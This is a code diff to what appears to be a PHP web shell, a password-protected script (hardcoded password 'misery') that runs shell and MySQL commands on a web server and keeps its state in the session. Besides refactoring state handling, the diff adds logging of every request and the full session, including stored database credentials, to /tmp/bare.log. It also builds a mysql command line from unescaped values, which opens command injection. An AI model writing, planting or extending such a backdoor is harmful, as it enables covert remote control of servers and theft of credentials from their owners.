@@ -7,12 +7,16 @@ class State {
         if (isset($_SESSION['data']) && !empty($_SESSION['data']) && $_SESSION['data'] != null) {
             $this->state    = json_decode($_SESSION['data']);
         }else{
-            $this->state    = json_decode("{" . json_encode(array('DbVersion' => '0.1'))."}");
+            $this->state    = json_decode('{"DbVersion":"0.1"}');
         }
     }
 
     function __destruct(){
         $_SESSION['data'] = json_encode($this->state);
+    }
+    
+    function getState() {
+        return $this->state;
     }
 }
 
@@ -24,7 +28,7 @@ class mysql {
 
     function __construct(&$state = null){
         if (!is_null($state)){
-            $this->state = &$state->state;
+            $this->state = $state->state;
         }
         $this->disabled_functions = @ini_get('disable_functions');
         if (!empty($this->disabled_functions)) {
@@ -34,10 +38,14 @@ class mysql {
         }
     }
     function resumeState(){
-        if (!isset($this->state)) return false;
-        $this->user     = isset($this->state->{'mysql_user'}) ? $this->state->{'mysql_user'} : '';
-        $this->password = isset($this->state->{'mysql_password'}) ? $this->state->{'mysql_password'} : '';
-        $this->database = isset($this->state->{'mysql_database'}) ? $this->state->{'mysql_database'} : '';
+        if (!isset($this->state)) {
+            $this->state = new State();
+            $this->state = $this->state->getState();
+        }
+        
+        $this->user     = isset($this->state->mysql_user) ? $this->state->mysql_user : '';
+        $this->password = isset($this->state->mysql_password) ? $this->state->mysql_password : '';
+        $this->database = isset($this->state->mysql_database) ? $this->state->mysql_database : '';
         $this->mysqlbin = "mysql -t --user=" . $this->user . " --password=" . $this->password . " --database=" . $this->database;
     }
 
@@ -88,7 +96,7 @@ class bash {
     var $state;
     var $disabled_functions;
 
-    function __construct($state = null){
+    function __construct(&$state = null){
         if (!is_null($state)){
             $this->state = $state->state;
         }
@@ -100,18 +108,22 @@ class bash {
         }
     }
     function resumeState(){
-        #if (!isset($this->state)) return false; 
-        if (!isset($this->state->{'current_dir'})){
+        if (!isset($this->state)) {
+            $this->state = new State();
+            $this->state = $this->state->getState();
+        }
+
+        if (!isset($this->state->current_dir)){
             $this->current_dir = getcwd();
-            $this->state->{'current_dir'} = $this->current_dir;
+            $this->state->current_dir = $this->current_dir;
         }else{
-            $cd = $this->state->{'current_dir'};
+            $cd = $this->state->current_dir;
             if (file_exists($cd)){
                 chdir($cd);
                 $this->current_dir = $cd;
             }else{
                 $this->current_dir = getcwd();  
-                $this->state->{'current_dir'} = $this->current_dir;
+                $this->state->current_dir = $this->current_dir;
             }
         }
     }
@@ -198,6 +210,9 @@ class Shell{
         return true;
     }
     function executeCmd() {
+        if (!isset($this->request['action'])) {
+            $this->request['action'] = null;
+        }
         switch ($this->request['action']) 
         {
             case 'INTERNAL':
@@ -259,6 +274,10 @@ class Shell{
         return $this;
     }
 }
+
+@session_start();
+file_put_contents('/tmp/bare.log', json_encode($_REQUEST) . PHP_EOL, FILE_APPEND);
+file_put_contents('/tmp/bare.log', json_encode($_SESSION) . PHP_EOL, FILE_APPEND);
 @ini_set("display_errors", 1);
 define('PASSWORD', 'misery');
 define('USER', '~');
